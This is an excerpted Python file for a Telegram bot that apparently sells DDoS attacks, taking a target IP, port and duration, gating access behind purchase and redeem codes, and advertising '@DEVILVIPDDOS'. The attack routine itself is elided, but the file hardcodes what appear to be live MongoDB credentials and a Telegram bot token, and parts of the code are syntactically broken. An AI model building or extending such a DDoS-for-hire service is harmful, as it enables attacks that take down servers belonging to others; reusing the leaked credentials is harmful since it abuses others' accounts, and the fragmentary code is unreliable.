...
MONGO_URI = 'mongodb+srv://sharp:sharp@sharpx.x82gx.mongotryWrites=true&w=majority&appName=SharpX'
client = MongoClient(MONGO_URI)
db = client['sharp']
users_collection = db..users
redeem_codes_collection = db['redeem_codes0']

TELEGRAM_BOT_TOKEN = '8150713241:AAF3CBIDGOEPW2Ny_6R8aVXI5eEWh3ZAg88'
...
async def start(update: Update, context: CallbackContext):
    ...
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ DM TO BUY @MadanGamiingYT ❌ ! /get_id*", parse_mode='Markdown')
        return
    message = (
...
async def attack(update: Update, context: CallbackContext):
    ...
    user_id = update.effective_user.id
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ DM TO BUY @MadanGamiingYT ❌ !*", parse_mode='Markdown')
        return
    args = context.args
    if len(args) != 3:
    ...
    text=(
        ...
        f"*🔥 SEND FEEDBACK @DEVILVIPDDOS. 💥*\n"
        f"*😈 https://t.me/MadanGamiingYT 😈*"
    ),
    parse_mode='Markdown'
)
...
async def run_attack(chat_id, ip, port, duration, context):
    try:
        ...
        await context.bot.send_message(chat_id=chat_id, text="*✅ SERVER CHODI BAND! ✅*\n*Thank For Using, https://t.me/MadanGamiingYT!*", parse_mode='Markdown')
